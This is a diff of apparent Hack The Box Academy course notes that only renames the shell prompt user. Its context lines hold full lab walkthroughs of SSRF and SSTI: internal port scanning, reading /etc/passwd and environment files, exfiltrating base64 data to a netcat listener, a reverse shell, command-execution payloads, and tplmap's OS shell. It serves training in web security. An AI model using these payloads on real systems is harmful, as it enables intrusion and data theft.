@@ -158,8 +158,8 @@ After this file is created, install the docker package in your local machine and
 **Docker Installation**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt install docker.io
-AbdulrahmanTamim@htb[/htb]$ sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"
+root@htb[/htb]$ sudo apt install docker.io
+root@htb[/htb]$ sudo docker run -it --rm -p 8009:8009 -v `pwd`/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml --name tomcat "tomcat:8.0"
 ```
 
 
@@ -178,20 +178,20 @@ When we come across an open AJP proxy port (8009 TCP), we can use Nginx with the
 **Download Nginx Source Code**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget https://nginx.org/download/nginx-1.21.3.tar.gz
-AbdulrahmanTamim@htb[/htb]$ tar -xzvf nginx-1.21.3.tar.gz
+root@htb[/htb]$ wget https://nginx.org/download/nginx-1.21.3.tar.gz
+root@htb[/htb]$ tar -xzvf nginx-1.21.3.tar.gz
 ```
 
 **Compile Nginx source code with the ajp module**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/dvershinin/nginx_ajp_module.git
-AbdulrahmanTamim@htb[/htb]$ cd nginx-1.21.3
-AbdulrahmanTamim@htb[/htb]$ sudo apt install libpcre3-dev
-AbdulrahmanTamim@htb[/htb]$ ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
-AbdulrahmanTamim@htb[/htb]$ make
-AbdulrahmanTamim@htb[/htb]$ sudo make install
-AbdulrahmanTamim@htb[/htb]$ nginx -V
+root@htb[/htb]$ git clone https://github.com/dvershinin/nginx_ajp_module.git
+root@htb[/htb]$ cd nginx-1.21.3
+root@htb[/htb]$ sudo apt install libpcre3-dev
+root@htb[/htb]$ ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
+root@htb[/htb]$ make
+root@htb[/htb]$ sudo make install
+root@htb[/htb]$ nginx -V
 
 nginx version: nginx/1.21.3
 built by gcc 10.2.1 20210110 (Debian 10.2.1-6)
@@ -223,8 +223,8 @@ Note: If you are using Pwnbox, then port 80 will be in use already, so, in the a
 Start Nginx and check if everything is working correctly by issuing a cURL request to your local host.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nginx
-AbdulrahmanTamim@htb[/htb]$ curl http://127.0.0.1:80
+root@htb[/htb]$ sudo nginx
+root@htb[/htb]$ curl http://127.0.0.1:80
 
 <!DOCTYPE html>
 <html lang="en">
@@ -276,18 +276,18 @@ The required commands and configuration files are the following:
 &#x20; Apache Reverse Proxy & AJP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt install libapache2-mod-jk
-AbdulrahmanTamim@htb[/htb]$ sudo a2enmod proxy_ajp
-AbdulrahmanTamim@htb[/htb]$ sudo a2enmod proxy_http
-AbdulrahmanTamim@htb[/htb]$ export TARGET="<TARGET_IP>"
-AbdulrahmanTamim@htb[/htb]$ echo -n """<Proxy *>
+root@htb[/htb]$ sudo apt install libapache2-mod-jk
+root@htb[/htb]$ sudo a2enmod proxy_ajp
+root@htb[/htb]$ sudo a2enmod proxy_http
+root@htb[/htb]$ export TARGET="<TARGET_IP>"
+root@htb[/htb]$ echo -n """<Proxy *>
 Order allow,deny
 Allow from all
 </Proxy>
 ProxyPass / ajp://$TARGET:8009/
 ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
-AbdulrahmanTamim@htb[/htb]$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
-AbdulrahmanTamim@htb[/htb]$ sudo systemctl start apache2
+root@htb[/htb]$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf
+root@htb[/htb]$ sudo systemctl start apache2
 ```
 
 Note: The below cURL command is the one you would normally use, since Apache is listening on port 80 by default. Remember that you had to change port 80 to another one of your choosing. So, to complete the exercise of the previous section, next step would be to specify the port of your choosing while using cURL, "curl http://127.0.0.1:8080" for example.
@@ -297,7 +297,7 @@ Note: The below cURL command is the one you would normally use, since Apache is 
 &#x20; Apache Reverse Proxy & AJP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://127.0.0.1
+root@htb[/htb]$ curl http://127.0.0.1
 
 <SNIP>
 <!DOCTYPE html>
@@ -383,7 +383,7 @@ Basic reconnaissance against the host shows there are only three open ports.
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>
+root@htb[/htb]$ nmap -sT -T5 --min-rate=10000 -p- <TARGET IP>
 
 Nmap scan report for <TARGET IP>
 Host is up (0.00047s latency).
@@ -403,7 +403,7 @@ Let's issue a cURLrequest to the target server using the parameters `-i` to show
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s http://<TARGET IP>
+root@htb[/htb]$ curl -i -s http://<TARGET IP>
 
 HTTP/1.0 302 FOUND
 Content-Type: text/html; charset=utf-8
@@ -424,7 +424,7 @@ We can see the request redirected to `/load?q=index.html`, meaning the `q` param
 
 ```shell-session
 
-AbdulrahmanTamim@htb[/htb]$ curl -i -s -L http://<TARGET IP>
+root@htb[/htb]$ curl -i -s -L http://<TARGET IP>
 
 HTTP/1.0 302 FOUND
 Content-Type: text/html; charset=utf-8
@@ -459,7 +459,7 @@ In one terminal, let's use Netcat to listen on port 8080, as follows.
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -nvlp 8080
+root@htb[/htb]$ nc -nvlp 8080
 
 listening on [any] 8080 ...
 ```
@@ -471,7 +471,7 @@ Now, let us issue a request to the target web application with `http://<VPN/TUN 
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -518,7 +518,7 @@ Code: html
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 -m http.server 9090
+root@htb[/htb]$ python3 -m http.server 9090
 ```
 
 3. Inside the directory where index.html is located, start an FTP Server via the following command
@@ -528,8 +528,8 @@ AbdulrahmanTamim@htb[/htb]$ python3 -m http.server 9090
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo pip3 install twisted
-AbdulrahmanTamim@htb[/htb]$ sudo python3 -m twisted ftp -p 21 -r .
+root@htb[/htb]$ sudo pip3 install twisted
+root@htb[/htb]$ sudo python3 -m twisted ftp -p 21 -r .
 ```
 
 4. Retrieve index.html through the target application using the `ftp` schema, as follows
@@ -539,7 +539,7 @@ AbdulrahmanTamim@htb[/htb]$ sudo python3 -m twisted ftp -p 21 -r .
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=ftp://<VPN/TUN Adapter IP>/index.html"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -561,7 +561,7 @@ Date: Tue, 19 Oct 2021 11:21:09 GMT
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -583,7 +583,7 @@ Date: Tue, 19 Oct 2021 11:26:18 GMT
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd" 
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -623,7 +623,7 @@ Remember, we only have two open ports on the target server. However, there is a 
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ for port in {1..65535};do echo $port >> ports.txt;done
+root@htb[/htb]$ for port in {1..65535};do echo $port >> ports.txt;done
 ```
 
 2. Issue a cURL request to a random port to get the response size of a request for a non-existent service.
@@ -633,7 +633,7 @@ AbdulrahmanTamim@htb[/htb]$ for port in {1..65535};do echo $port >> ports.txt;do
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:1"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -651,7 +651,7 @@ Date: Tue, 19 Oct 2021 11:36:25 GMT
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
+root@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -686,7 +686,7 @@ We have received a valid response for port `5000`. Let us check it as follows.
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -706,7 +706,7 @@ First, we issue a simple cURL request to the internal application we discovered 
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -729,7 +729,7 @@ Now, let us discover any web applications listening in localhost. Let us try to 
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -747,7 +747,7 @@ We have received an `unknown url type` error message. It seems the web applicati
 &#x20; SSRF Exploitation Example
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -763,7 +763,7 @@ In this case, the web application returns some HTML rendered content containing 
 **Port Fuzzing**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'
+root@htb[/htb]$ ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'
 
 
         /'___\  /'___\           /'___\
@@ -797,7 +797,7 @@ We have found another application listening on port 5000. In this case, the appl
 **cURL - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -828,7 +828,7 @@ Let us issue a request to disclose `/proc/self/environ` file, where the current 
 **cURL - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -844,7 +844,7 @@ Now we know that the current path is `/app`, and we have a list of interesting f
 **Retrieving a local file through the target application - File Schema**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -889,7 +889,7 @@ By studying the source code above, we notice a functionality that allows us to e
 **cURL - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -905,7 +905,7 @@ We can execute commands under the superuser context on the target application. B
 
 ```shell-session
 
-AbdulrahmanTamim@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"
+root@htb[/htb]$ curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"
 
 HTTP/1.0 400 Bad request syntax ('GET /load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a HTTP/1.1')
 Connection: close
@@ -933,8 +933,8 @@ To execute commands with arguments or special characters, we need to encode them
 For doing so, you can use any online URL-encoding service such as [urlencoder.org](https://www.urlencoder.org/). A quick way to achieve this from the terminal also exists. This is to use `jq`, which supports encoding as follows:
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt-get install jq
-AbdulrahmanTamim@htb[/htb]$ echo "encode me" | jq -sRr @uri
+root@htb[/htb]$ sudo apt-get install jq
+root@htb[/htb]$ echo "encode me" | jq -sRr @uri
 encode%20me%0A
 ```
 
@@ -943,7 +943,7 @@ We can now create a bash function to automate executing commands on the target a
 **Automate executing commands**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ function rce() {
+root@htb[/htb]$ function rce() {
 function> while true; do
 function while> echo -n "# "; read cmd
 function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
@@ -956,7 +956,7 @@ function> }
 Now we need to call the function and execute commands via:
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ rce
+root@htb[/htb]$ rce
 # uname -a; hostname; whoami
 
 <html><body><h1>Resource: http://127.0.0.1:5000/runme?x=uname%20-a%3B%20hostname%3B%20whoami
@@ -1014,7 +1014,7 @@ For the sake of simplicity, the service we will use to test for a blind SSRF vul
 **Netcat Listener**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nc -nlvp 9090
+root@htb[/htb]$ sudo nc -nlvp 9090
 
 Listening on 0.0.0.0 9090
 ```
@@ -1064,7 +1064,7 @@ Let us start an HTTP Server, submit the new HTML file, wait for the response, an
 **Netcat Listener**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nc -nlvp 9090
+root@htb[/htb]$ sudo nc -nlvp 9090
 
 Listening on 0.0.0.0 9090
 GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1
@@ -1082,7 +1082,7 @@ Host: 10.10.14.221:9090
 **Base64 Decoding**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo """cm9vdDp4OjA6MDpyb290Oi9yb<SNIP>""" | base64 -d
+root@htb[/htb]$ echo """cm9vdDp4OjA6MDpyb290Oi9yb<SNIP>""" | base64 -d
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -1144,7 +1144,7 @@ Now, let us create an HTML file that performs a GET request to internal.app.loca
 Once we start a Netcat listener on our machine and submit the HTML file above, we receive a reverse shell coming from `internal.app.local`.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -nvlp 9090
+root@htb[/htb]$ nc -nvlp 9090
 
 listening on [any] 9090 ...
 Connection received on 10.129.201.238 33100
@@ -1411,7 +1411,7 @@ In this case, we can inject a template expression directly, and the server will 
 **cURL - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'
+root@htb[/htb]$ curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'
 
 HTTP/1.0 200 OK
 Content-Type: text/html; charset=utf-8
@@ -1515,13 +1515,13 @@ We could have automated the template engine identification process we just execu
 **tplmap.py**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/epinna/tplmap.git
-AbdulrahmanTamim@htb[/htb]$ cd tplmap
-AbdulrahmanTamim@htb[/htb]$ pip install virtualenv
-AbdulrahmanTamim@htb[/htb]$ virtualenv -p python2 venv
-AbdulrahmanTamim@htb[/htb]$ source venv/bin/activate
-AbdulrahmanTamim@htb[/htb]$ pip install -r requirements.txt
-AbdulrahmanTamim@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john
+root@htb[/htb]$ git clone https://github.com/epinna/tplmap.git
+root@htb[/htb]$ cd tplmap
+root@htb[/htb]$ pip install virtualenv
+root@htb[/htb]$ virtualenv -p python2 venv
+root@htb[/htb]$ source venv/bin/activate
+root@htb[/htb]$ pip install -r requirements.txt
+root@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john
 
 [+] Tplmap 0.5
     Automatic Server-Side Template Injection Detection and Exploitation Tool
@@ -1581,7 +1581,7 @@ Let's submit the payload using cURL this time.
 **cURL - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>
+root@htb[/htb]$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>
 
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
 "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
@@ -1628,7 +1628,7 @@ Again, we could have automated the template engine exploitation process we just 
 **tplmap.py - OS Shell**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell
+root@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell
 
 [+] Tplmap 0.5
     Automatic Server-Side Template Injection Detection and Exploitation Tool
@@ -1694,7 +1694,7 @@ Let's submit mathematical expressions in curly brackets to the input field, such
 **cURL - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam
+root@htb[/htb]$ curl -X POST -d 'email=${7*7}' http://<TARGET IP>:<PORT>/jointheteam
 
 <html>
 <head>
@@ -1718,7 +1718,7 @@ It doesn't look like the application evaluated the submitted expression. Let's t
 **cURL - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam
+root@htb[/htb]$ curl -X POST -d 'email={{7*7}}' http://<TARGET IP>:<PORT>/jointheteam
 
 <html>
 <head>
@@ -1742,7 +1742,7 @@ The application evaluated the submitted expression this time. Let's continue, as
 **cURL - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d 'email={{7*'7'}}' http://<TARGET IP>:<PORT>/jointheteam
+root@htb[/htb]$ curl -X POST -d 'email={{7*'7'}}' http://<TARGET IP>:<PORT>/jointheteam
 
 <html>
 <head>
@@ -1766,19 +1766,19 @@ The application evaluated the latest expression we submitted. So, according to t
 Unfortunately, this is not the case! If we submit any Twig or Jinja2-specific payload, the application returns `500: Internal Server Error`. Find some examples of this behavior below.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d 'email={{_self.env.display("TEST")}}' http://<TARGET IP>:<PORT>/jointheteam
+root@htb[/htb]$ curl -X POST -d 'email={{_self.env.display("TEST")}}' http://<TARGET IP>:<PORT>/jointheteam
 
 <html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>
 ```
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam
+root@htb[/htb]$ curl -X POST -d 'email={{config.items()}}' http://<TARGET IP>:<PORT>/jointheteam
 
 <html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>
 ```
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam
+root@htb[/htb]$ curl -X POST -d 'email={{ [].class.base.subclasses() }}' http://<TARGET IP>:<PORT>/jointheteam
 
 <html><title>500: Internal Server Error</title><body>500: Internal Server Error</body></html>
 ```
@@ -1790,7 +1790,7 @@ It should be straightforward now that no methodology is bulletproof. We could co
 Eventually, when submitting [Tornado](https://www.tornadoweb.org/en/stable/guide/templates.html)-specific payloads, we will come across the below.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST -d "email={% raw %}
+root@htb[/htb]$ curl -X POST -d "email={% raw %}
 {% import os %}
 {% endraw %}{{os.system('whoami')}}" http://<TARGET IP>:<PORT>/jointheteam
 
@@ -1818,7 +1818,7 @@ As already mentioned in previous sections, `tplmap` can be used to automate both
 **tplmap.py**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=blah
+root@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/jointheteam' -d email=blah
 
     Automatic Server-Side Template Injection Detection and Exploitation Tool
 
@@ -1878,7 +1878,7 @@ User input is submitted via the `cmd` parameter through a GET request. Let's sub
 &#x20; SSTI Exploitation Example 3
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={7*7}"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={7*7}"
 
 <!DOCTYPE html>
 <html lang="en">
@@ -1942,7 +1942,7 @@ It doesn't look like the application evaluated the submitted expression. Let us 
 &#x20; SSTI Exploitation Example 3
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}'
+root@htb[/htb]$ curl -gs 'http://<TARGET IP>:<PORT>/execute?cmd=${7*7}'
 
 <!DOCTYPE html>
 <html lang="en">
@@ -2005,7 +2005,7 @@ It doesn't look like the application evaluated this expression either. What abou
 &#x20; SSTI Exploitation Example 3
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*7}}"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*7}}"
 
 <!DOCTYPE html>
 <html lang="en">
@@ -2070,7 +2070,7 @@ As already mentioned, the first thing we need to do when dealing with SSTI vulne
 &#x20; SSTI Exploitation Example 3
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd={{7*'7'}}"
 
 <!DOCTYPE html>
 <html lang="en">
@@ -2137,7 +2137,7 @@ We could have automated the template engine identification process we just execu
 &#x20; SSTI Exploitation Example 3
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'
+root@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'
 
     Automatic Server-Side Template Injection Detection and Exploitation Tool
 
@@ -2193,7 +2193,7 @@ Start by running Python on Pwnbox's or a local VM's terminal, then follow along.
 **Python 3 Interpreter**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3
+root@htb[/htb]$ python3
 
 Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
 [GCC 10.2.1 20210110] on linux
@@ -2321,7 +2321,7 @@ Payload:
 **Curl - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__%20%7D%7D"
 
 <SNIP>
 <body>
@@ -2348,7 +2348,7 @@ AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%
 **Curl - Interacting with the Target**
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
 
 <SNIP>
 <body>
@@ -2373,7 +2373,7 @@ We are interested in the second item, so the payload should become:
 ```
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
+root@htb[/htb]$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__class__.__mro__%20%7D%7D"
 
 <SNIP>
 <body>
@@ -2398,7 +2398,7 @@ Let us start walking down the hierarchy, as follows.
 ```
 
 ```shell-session
